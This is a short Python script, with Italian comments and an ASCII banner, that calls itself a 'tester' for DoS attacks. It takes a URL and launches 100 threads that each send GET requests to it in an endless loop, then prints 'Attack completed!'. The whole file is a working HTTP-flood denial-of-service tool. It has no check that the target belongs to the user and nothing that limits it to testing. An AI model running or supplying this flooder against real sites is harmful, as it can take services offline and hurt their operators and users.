import threading
import requests
import optparse

a = """
    
                                       __ 
 _____     _ _       _       _ _      |  |
| __  |___| | |_ ___| |_ ___|_| |_ ___|  |
| __ -| . | |  _|_ -|  _|  _| | '_| -_|__|
|_____|___|_|_| |___|_| |_| |_|_,_|___|__|
by @d.cestaro Instagram
A simple tester if of DoS attack
                                          
"""
print(a)
# Funzione per avviare un singolo thread
def attack(url):
    while True:
        try:
            # Invia una richiesta GET all'URL specificato
            requests.get(url)
        except:
            # Se si verifica un errore, interrompi il thread
            break

# Funzione per impostare le opzioni di linea di comando
def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL del sito da testare")
    options, _ = parser.parse_args()
    if not options.url:
        parser.error("[-] Specify an URL, use --help for more informations.")
    return options

# Numero di thread da utilizzare per l'attacco
thread_count = 100

# Ottieni l'URL del sito da testare dalle opzioni di linea di comando
options = get_args()
url = options.url

# Crea i thread
threads = []
for i in range(thread_count):
    t = threading.Thread(target=attack, args=(url,))
    threads.append(t)

# Avvia i thread
for t in threads:
    t.start()

# Aspetta che i thread siano completati
for t in threads:
    t.join()

print("Attack completed!")
